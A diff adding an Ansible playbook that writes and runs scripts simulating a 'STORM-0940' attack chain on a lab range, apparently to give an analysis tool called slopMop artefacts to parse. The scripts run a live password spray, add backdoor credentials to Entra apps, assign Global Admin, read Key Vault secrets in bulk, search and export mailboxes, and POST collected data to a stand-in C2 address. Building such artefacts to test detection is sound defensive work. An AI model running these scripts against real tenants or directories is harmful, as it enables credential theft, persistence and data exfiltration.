@@ -1,0 +1,578 @@
+---
+# ---------------------------------------------------------------------------
+# SlopMop | STORM-0940 artefact scripts
+#
+# Generates standalone script files (.ps1, .sh, .jsonl) that simulate the
+# STORM-0940 attack chain described in Get-Sybers/slopMop#7.  The scripts
+# are written to the slopmop-capture directory on each host so slopMop can
+# parse them for tools, tactics, and indicators.
+#
+# Scripts that call Azure/M365 cmdlets will FAIL at runtime (no modules or
+# cloud connectivity on this range) — that is expected.  slopMop analyses
+# the script TEXT, not execution results.  The password-spray step on kali
+# produces real output against the range AD.
+# ---------------------------------------------------------------------------
+
+- name: "SlopMop | Kali STORM-0940 artefacts (spray + ARTEX logs)"
+  hosts: kali
+  become: false
+  gather_facts: false
+  vars:
+    cap: /home/kali/slopmop-capture
+    ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
+    suna_dc: "{{ hostvars['suna-dc1'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    ws1_ip: "{{ hostvars['konoha-ws1'].ansible_host }}"
+    konoha_net: "{{ konoha_dc | regex_replace('\\d+$', '0/24') }}"
+    suna_net: "{{ suna_dc | regex_replace('\\d+$', '0/24') }}"
+    storm_c2: 198.51.100.99
+    storm_c2b: 198.51.100.128
+  tasks:
+    # ---- Step 11: password spray via crackmapexec ----
+    - name: "Build target user list for spray"
+      ansible.builtin.copy:
+        content: |
+          Administrator
+          svc_adsync
+          svc_backup
+          admin.user
+          naruto.uzumaki
+          sakura.haruno
+          kakashi.hatake
+          gaara.sabaku
+        dest: "{{ cap }}/spray-users.txt"
+        mode: "0644"
+
+    - name: "Deploy step11 — Password spray"
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env bash
+          set -o pipefail
+          USERS="{{ cap }}/spray-users.txt"
+          DC="{{ suna_dc }}"
+          OUT="{{ cap }}/spray-results_$(date -u +%Y%m%d_%H%M%S).txt"
+
+          echo "=== STORM-0940 Password Spray ===" > "$OUT"
+          echo "Target: $DC (sunagakure.wind.ninja)" >> "$OUT"
+          echo "Source: {{ storm_c2 }}" >> "$OUT"
+          echo "Start: $(date -u +%FT%TZ)" >> "$OUT"
+          echo "" >> "$OUT"
+
+          crackmapexec smb "$DC" \
+            -u "$USERS" \
+            -p 'Spring2026!' 'Welcome1' 'Password1' \
+            --continue-on-success \
+            2>&1 | tee -a "$OUT"
+
+          echo "" >> "$OUT"
+          echo "End: $(date -u +%FT%TZ)" >> "$OUT"
+        dest: "{{ cap }}/{{ ts_h }}1100_step11_password-spray.sh"
+        mode: "0755"
+      register: s11
+
+    - name: "Run step11"
+      ansible.builtin.shell: |
+        set -o pipefail
+        {{ s11.dest }} 2>&1 | tail -20
+      changed_when: false
+      failed_when: false
+
+    # ---- Step 12: ARTEX-style structured agent logs ----
+    - name: "Deploy step12 — ARTEX agent log generator"
+      ansible.builtin.copy:
+        content: |
+          #!/usr/bin/env bash
+          TS=$(date -u +%Y%m%d_%H%M%S)
+          OUT="{{ cap }}/artex-agent_${TS}.jsonl"
+          J() { printf '%s' "$@" >> "$OUT"; printf '\n' >> "$OUT"; }
+
+          J '{"step":1,"agent":"recon",' \
+            '"command":"nmap -sn {{ konoha_net }} {{ suna_net }}",' \
+            '"status":"success","output":"8 hosts up",' \
+            '"timestamp":"2026-11-16T10:00:00Z"}'
+
+          J '{"step":2,"agent":"enum",' \
+            '"command":"ldapsearch -H ldap://{{ suna_dc }} -x",' \
+            '"status":"success","output":"22 entries",' \
+            '"timestamp":"2026-11-16T10:01:00Z"}'
+
+          J '{"step":3,"agent":"spray",' \
+            '"command":"crackmapexec smb {{ suna_dc }} -u users.txt",' \
+            '"status":"success","output":"svc_adsync:Spring2026!",' \
+            '"timestamp":"2026-11-16T10:02:00Z"}'
+
+          J '{"step":4,"agent":"cred",' \
+            '"command":"impacket-secretsdump svc_adsync@{{ suna_dc }}",' \
+            '"status":"success","output":"Administrator:500:aad3b435",' \
+            '"timestamp":"2026-11-16T10:03:00Z"}'
+
+          J '{"step":5,"agent":"lateral",' \
+            '"command":"impacket-psexec Administrator@{{ ws1_ip }}",' \
+            '"status":"success","output":"C:\\Windows\\system32>",' \
+            '"timestamp":"2026-11-16T10:04:00Z"}'
+
+          CID="6f1d2c3b-4a5e-4f60-8b7c-9d0e1f2a3b4c"
+          J '{"step":6,"agent":"cloud",' \
+            "\"command\":\"Connect-MgGraph -ClientId ${CID}\"," \
+            '"status":"success","output":"Welcome To Graph!",' \
+            '"timestamp":"2026-11-16T10:05:00Z"}'
+
+          J '{"step":7,"agent":"cloud",' \
+            '"command":"Get-MgUser -All",' \
+            '"status":"success","output":"22 users enumerated",' \
+            '"timestamp":"2026-11-16T10:06:00Z"}'
+
+          AID="a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+          J '{"step":8,"agent":"persist",' \
+            "\"command\":\"Add-MgApplicationPassword -ApplicationId ${AID}\"," \
+            '"status":"success","output":"secretText: wJk8Q~...",' \
+            '"timestamp":"2026-11-16T10:07:00Z"}'
+
+          ROLEID="62e90394-69f5-4237-9190-012177145e10"
+          J '{"step":9,"agent":"privesc",' \
+            "\"command\":\"New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId ${ROLEID}\"," \
+            '"status":"success","output":"Global Admin assigned",' \
+            '"timestamp":"2026-11-16T10:08:00Z"}'
+
+          GRAPH="https://graph.microsoft.com/v1.0"
+          J '{"step":10,"agent":"exfil",' \
+            "\"command\":\"Invoke-RestMethod -Uri ${GRAPH}/users/admin/messages\"," \
+            '"status":"success","output":"142 messages",' \
+            '"timestamp":"2026-11-16T10:09:00Z"}'
+
+          J '{"step":11,"agent":"vault",' \
+            '"command":"Get-AzKeyVaultSecret -VaultName suna-keyvault",' \
+            '"status":"success","output":"secretValue: Server=sql01",' \
+            '"timestamp":"2026-11-16T10:10:00Z"}'
+
+          C2="https://{{ storm_c2b }}:443"
+          J '{"step":12,"agent":"exfil",' \
+            "\"command\":\"curl -X POST ${C2}/collect -d @secrets.json\"," \
+            '"status":"success","output":"HTTP 200 OK",' \
+            '"timestamp":"2026-11-16T10:11:00Z"}'
+          echo "Wrote $OUT ($(wc -l < "$OUT") entries)"
+        dest: "{{ cap }}/{{ ts_h }}1200_step12_artex-logs.sh"
+        mode: "0755"
+      register: s12
+
+    - name: "Run step12"
+      ansible.builtin.command: "{{ s12.dest }}"
+      changed_when: false
+      failed_when: false
+
+    - name: "List kali STORM-0940 artefacts"
+      ansible.builtin.shell: |
+        set -o pipefail
+        ls -la {{ cap }}/*step1[12]* {{ cap }}/artex-* {{ cap }}/spray-* 2>/dev/null
+      changed_when: false
+      failed_when: false
+
+- name: "SlopMop | WS01 STORM-0940 artefacts (cloud, vault, email, exfil)"
+  hosts: konoha-ws1
+  gather_facts: false
+  vars:
+    cap: C:\slopmop-capture
+    ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
+    storm_c2: 198.51.100.99
+    storm_c2b: 198.51.100.128
+  tasks:
+    # ---- Step 11: Entra ID recon + OAuth credential abuse ----
+    - name: "Deploy step11 — Entra ID recon and OAuth abuse"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $log = "$cap\entra-oauth_$ts.log"
+          $out = ""
+          $out += "=== STORM-0940: Entra ID Recon + OAuth Credential Abuse ===`r`n"
+          $out += "Start: $(Get-Date -Format o)`r`n`r`n"
+
+          $tenantId = "6f1d2c3b-4a5e-4f60-8b7c-9d0e1f2a3b4c"
+          $clientId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+          $scope = "https://graph.microsoft.com/.default"
+
+          # Stage 1 — authenticate to Entra ID
+          $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
+          $out += "[+] Token endpoint: $tokenUrl`r`n"
+          $out += "[+] Client ID: $clientId`r`n"
+          $out += "[+] Scope: $scope`r`n"
+          try {
+            $tokenBody = @{
+              client_id     = $clientId
+              scope         = $scope
+              grant_type    = "client_credentials"
+              client_secret = "wJk8Q~fake-secret-for-artefact-generation"
+            }
+            $token = Invoke-RestMethod -Uri $tokenUrl -Method POST `
+              -Body $tokenBody -ContentType "application/x-www-form-urlencoded"
+            $out += "[+] Access token: $($token.access_token.Substring(0,40))...`r`n"
+          } catch {
+            $out += "[!] Token request failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 2 — enumerate users via Microsoft Graph
+          $graphBase = "https://graph.microsoft.com/v1.0"
+          try {
+            $users = Invoke-RestMethod -Uri "$graphBase/users" `
+              -Headers @{Authorization = "Bearer eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJncmFwaCJ9.fake"}
+            $out += "[+] Graph /users: $($users.value.Count) users`r`n"
+          } catch {
+            $out += "[!] Graph /users failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 3 — enumerate applications
+          try {
+            $apps = Invoke-RestMethod -Uri "$graphBase/applications" `
+              -Headers @{Authorization = "Bearer eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJncmFwaCJ9.fake"}
+            $out += "[+] Graph /applications: $($apps.value.Count) apps`r`n"
+          } catch {
+            $out += "[!] Graph /applications failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 4 — enumerate service principals
+          try {
+            $sps = Invoke-RestMethod -Uri "$graphBase/servicePrincipals" `
+              -Headers @{Authorization = "Bearer eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJncmFwaCJ9.fake"}
+            $out += "[+] Graph /servicePrincipals: $($sps.value.Count)`r`n"
+          } catch {
+            $out += "[!] Graph /servicePrincipals failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 5 — add credential to application (OAuth persistence)
+          $out += "[!] Add-MgApplicationPassword -ApplicationId $clientId`r`n"
+          try {
+            Add-MgApplicationPassword -ApplicationId $clientId `
+              -PasswordCredential @{
+                DisplayName = "slopMop-backdoor"
+                EndDateTime = (Get-Date).AddYears(2)
+              }
+            $out += "[+] Credential added to application`r`n"
+          } catch {
+            $out += "[!] Add-MgApplicationPassword failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 6 — add credential to service principal
+          $spId = "b2c3d4e5-f6a7-8901-bcde-f12345678901"
+          $out += "[!] Add-MgServicePrincipalPassword -ServicePrincipalId $spId`r`n"
+          try {
+            Add-MgServicePrincipalPassword -ServicePrincipalId $spId `
+              -PasswordCredential @{DisplayName = "slopMop-sp-backdoor"}
+            $out += "[+] Credential added to service principal`r`n"
+          } catch {
+            $out += "[!] Add-MgServicePrincipalPassword failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 7 — privilege escalation: assign Global Admin role
+          $globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
+          $out += "[!] New-MgRoleManagementDirectoryRoleAssignment`r`n"
+          $out += "    RoleDefinitionId: $globalAdminRoleId (Global Administrator)`r`n"
+          $out += "    PrincipalId: $clientId`r`n"
+          try {
+            New-MgRoleManagementDirectoryRoleAssignment `
+              -RoleDefinitionId $globalAdminRoleId `
+              -PrincipalId $clientId `
+              -DirectoryScopeId "/"
+            $out += "[+] Global Administrator role assigned`r`n"
+          } catch {
+            $out += "[!] Role assignment failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 8 — audit log check
+          $auditUrl = "$graphBase/auditLogs/directoryAudits"
+          try {
+            $audits = Invoke-RestMethod -Uri $auditUrl `
+              -Headers @{Authorization = "Bearer eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJncmFwaCJ9.fake"}
+            $out += "[+] Audit logs: $($audits.value.Count) entries`r`n"
+          } catch {
+            $out += "[!] Audit log query failed: $($_.Exception.Message)`r`n"
+          }
+
+          $out += "`r`nEnd: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}1100_step11_entra-oauth.ps1"
+      register: ws_s11
+
+    - name: "Run step11"
+      ansible.windows.win_shell: "& '{{ ws_s11.dest }}'"
+      failed_when: false
+
+    # ---- Step 12: Azure Key Vault bulk secret reads ----
+    - name: "Deploy step12 — Key Vault bulk reads"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $log = "$cap\keyvault-reads_$ts.log"
+          $out = ""
+          $out += "=== STORM-0940: Azure Key Vault Bulk Secret Reads ===`r`n"
+          $out += "Start: $(Get-Date -Format o)`r`n`r`n"
+
+          $vaults = @(
+            "https://suna-keyvault.vault.azure.net",
+            "https://konoha-secrets.vault.azure.net",
+            "https://fire-prod-kv.vault.azure.net"
+          )
+
+          $secrets = @(
+            "db-connection-string",
+            "api-key-prod",
+            "storage-account-key",
+            "smtp-password",
+            "jwt-signing-key",
+            "entra-client-secret",
+            "backup-encryption-key"
+          )
+
+          foreach ($vaultUrl in $vaults) {
+            $vaultName = ($vaultUrl -split '//')[1].Split('.')[0]
+            $out += "[*] Vault: $vaultUrl`r`n"
+
+            # Connect to Azure (will fail — no Az module)
+            try {
+              Connect-AzAccount -Identity 2>&1 | Out-Null
+            } catch {
+              $out += "    Connect-AzAccount: $($_.Exception.Message)`r`n"
+            }
+
+            foreach ($secret in $secrets) {
+              $out += "    Get-AzKeyVaultSecret -VaultName $vaultName"
+              $out += " -Name $secret`r`n"
+              try {
+                $sv = Get-AzKeyVaultSecret -VaultName $vaultName `
+                  -Name $secret -AsPlainText
+                $out += "    -> $($sv.Substring(0,20))...`r`n"
+              } catch {
+                $out += "    -> FAILED`r`n"
+              }
+
+              try {
+                Backup-AzKeyVaultSecret -VaultName $vaultName `
+                  -Name $secret `
+                  -OutputFile "$cap\kv-backup_${vaultName}_${secret}.blob"
+                $out += "    Backup-AzKeyVaultSecret -> saved`r`n"
+              } catch {
+                $out += "    Backup failed`r`n"
+              }
+            }
+            $out += "`r`n"
+          }
+
+          # Key Vault key read
+          try {
+            Get-AzKeyVaultKey -VaultName "suna-keyvault" -Name "rsa-signing"
+            $out += "[+] Get-AzKeyVaultKey suna-keyvault/rsa-signing`r`n"
+          } catch {
+            $out += "[!] Get-AzKeyVaultKey failed`r`n"
+          }
+
+          # Key Vault certificate read
+          try {
+            Get-AzKeyVaultCertificate -VaultName "suna-keyvault" `
+              -Name "wildcard-cert"
+            $out += "[+] Get-AzKeyVaultCertificate suna-keyvault/wildcard-cert`r`n"
+          } catch {
+            $out += "[!] Get-AzKeyVaultCertificate failed`r`n"
+          }
+
+          $out += "End: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}1200_step12_keyvault-reads.ps1"
+      register: ws_s12
+
+    - name: "Run step12"
+      ansible.windows.win_shell: "& '{{ ws_s12.dest }}'"
+      failed_when: false
+
+    # ---- Step 13: Email collection via Graph ----
+    - name: "Deploy step13 — Email collection via Microsoft Graph"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $log = "$cap\email-collection_$ts.log"
+          $out = ""
+          $out += "=== STORM-0940: Email Collection via Microsoft Graph ===`r`n"
+          $out += "Start: $(Get-Date -Format o)`r`n`r`n"
+
+          $graphBase = "https://graph.microsoft.com/v1.0"
+          $jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"
+          $jwt += ".eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20i"
+          $jwt += "LCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS"
+          $jwt += "5jb20vdGVuYW50LWlkL3YyLjAiLCJzdWIiOiJhMWIyYzNkNCJ9"
+          $jwt += ".signature_placeholder"
+          $headers = @{Authorization = "Bearer $jwt"}
+
+          $targets = @(
+            "admin@sunagakure.onmicrosoft.com",
+            "gaara.sabaku@sunagakure.onmicrosoft.com",
+            "naruto.uzumaki@konohagakure.onmicrosoft.com"
+          )
+
+          foreach ($user in $targets) {
+            # Get-MgUserMessage equivalent via REST
+            $messagesUrl = "$graphBase/users/$user/messages"
+            $out += "[*] Get-MgUserMessage -UserId $user`r`n"
+            $out += "    GET $messagesUrl`r`n"
+            try {
+              $msgs = Invoke-RestMethod -Uri $messagesUrl `
+                -Headers $headers
+              $out += "    -> $($msgs.value.Count) messages`r`n"
+            } catch {
+              $out += "    -> FAILED: $($_.Exception.Message)`r`n"
+            }
+
+            # Search mailbox for sensitive content
+            $searchUrl = "$graphBase/users/$user/messages"
+            $searchUrl += '?$filter=subject eq ''credentials'' or '
+            $searchUrl += "subject eq 'password reset'"
+            $out += "    Search: $searchUrl`r`n"
+            try {
+              $search = Invoke-RestMethod -Uri $searchUrl `
+                -Headers $headers
+              $out += "    -> $($search.value.Count) hits`r`n"
+            } catch {
+              $out += "    -> FAILED`r`n"
+            }
+
+            # Mail forwarding rule (persistence)
+            $rulesUrl = "$graphBase/users/$user/mailFolders"
+            $rulesUrl += "/inbox/messageRules"
+            $out += "    Inbox rules: $rulesUrl`r`n"
+          }
+
+          # PowerShell module equivalents
+          $out += "`r`n[*] Exchange Online cmdlets:`r`n"
+          $out += "    Connect-ExchangeOnline`r`n"
+          $out += "    Search-Mailbox -Identity admin@sunagakure.onmicrosoft.com"
+          $out += " -SearchQuery 'password OR credentials OR secret'`r`n"
+          $out += "    New-MailboxExportRequest -Mailbox admin"
+          $out += " -FilePath \\\\{% endraw %}{{ storm_c2b }}{% raw %}\\share\\admin.pst`r`n"
+
+          try {
+            Connect-ExchangeOnline -ShowBanner:$false
+          } catch {
+            $out += "    Connect-ExchangeOnline: $($_.Exception.Message)`r`n"
+          }
+
+          try {
+            Search-Mailbox -Identity "admin@sunagakure.onmicrosoft.com" `
+              -SearchQuery "password OR credentials OR secret" `
+              -TargetMailbox "exfil" -TargetFolder "collected"
+          } catch {
+            $out += "    Search-Mailbox: $($_.Exception.Message)`r`n"
+          }
+
+          $out += "`r`nEnd: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}1300_step13_email-collection.ps1"
+      register: ws_s13
+
+    - name: "Run step13"
+      ansible.windows.win_shell: "& '{{ ws_s13.dest }}'"
+      failed_when: false
+
+    # ---- Step 14: Exfiltration via Graph + C2 ----
+    - name: "Deploy step14 — Graph exfiltration to C2"
+      ansible.windows.win_copy:
+        content: |
+          {% raw %}
+          $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
+          $log = "$cap\graph-exfil_$ts.log"
+          $out = ""
+          $out += "=== STORM-0940: Exfiltration via Graph API + C2 ===`r`n"
+          $out += "Start: $(Get-Date -Format o)`r`n`r`n"
+
+          $graphBase = "https://graph.microsoft.com/v1.0"
+          $c2 = "https://{% endraw %}{{ storm_c2b }}{% raw %}:443"
+          $jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"
+          $jwt += ".eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20i"
+          $jwt += "LCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS"
+          $jwt += "5jb20vdGVuYW50LWlkL3YyLjAiLCJzdWIiOiJhMWIyYzNkNCJ9"
+          $jwt += ".signature_placeholder"
+
+          # Stage 1 — download sensitive data via Graph
+          $endpoints = @(
+            "$graphBase/users",
+            "$graphBase/groups",
+            "$graphBase/applications",
+            "$graphBase/servicePrincipals",
+            "$graphBase/directoryRoles",
+            "$graphBase/organization",
+            "$graphBase/oauth2PermissionGrants"
+          )
+
+          $collected = @()
+          foreach ($ep in $endpoints) {
+            $out += "[*] GET $ep`r`n"
+            try {
+              $resp = Invoke-RestMethod -Uri $ep `
+                -Headers @{Authorization = "Bearer $jwt"}
+              $collected += $resp
+              $out += "    -> $($resp.value.Count) items`r`n"
+            } catch {
+              $out += "    -> FAILED`r`n"
+            }
+          }
+
+          # Stage 2 — package collected data
+          $exfilData = $collected | ConvertTo-Json -Depth 5
+          $exfilPath = "$cap\exfil-graph_$ts.json"
+          $exfilData | Out-File $exfilPath -Encoding UTF8
+          $out += "[+] Collected data: $exfilPath`r`n"
+
+          # Stage 3 — exfil to C2 via Invoke-RestMethod
+          $out += "[!] Exfil to $c2/collect`r`n"
+          try {
+            Invoke-RestMethod -Uri "$c2/collect" -Method POST `
+              -Body $exfilData `
+              -ContentType "application/json"
+            $out += "    -> sent`r`n"
+          } catch {
+            $out += "    -> FAILED: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 4 — exfil to C2 via WebClient
+          try {
+            $wc = New-Object System.Net.WebClient
+            $wc.UploadString("$c2/data", "POST", $exfilData)
+            $out += "[!] WebClient POST to $c2/data: sent`r`n"
+          } catch {
+            $out += "[!] WebClient POST failed: $($_.Exception.Message)`r`n"
+          }
+
+          # Stage 5 — azcopy exfil attempt
+          $out += "[!] azcopy copy secrets.json"
+          $out += " https://exfilstorage.blob.core.windows.net/data/`r`n"
+
+          $out += "`r`nEnd: $(Get-Date -Format o)`r`n"
+          $out | Out-File -FilePath $log -Encoding UTF8
+          Write-Output $out
+          {% endraw %}
+        dest: "{{ cap }}\\{{ ts_h }}1400_step14_graph-exfil.ps1"
+      register: ws_s14
+
+    - name: "Run step14"
+      ansible.windows.win_shell: "& '{{ ws_s14.dest }}'"
+      failed_when: false
+
+    - name: "List WS01 STORM-0940 artefacts"
+      ansible.windows.win_shell: |
+        {% raw %}
+        Get-ChildItem "{% endraw %}{{ cap }}{% raw %}" |
+          Where-Object { $_.Name -match 'step1[1-4]|entra|keyvault|email-col|graph-exfil' } |
+          Sort-Object LastWriteTime |
+          Format-Table Name,Length,LastWriteTime -AutoSize |
+          Out-String -Width 120
+        {% endraw %}
+      changed_when: false
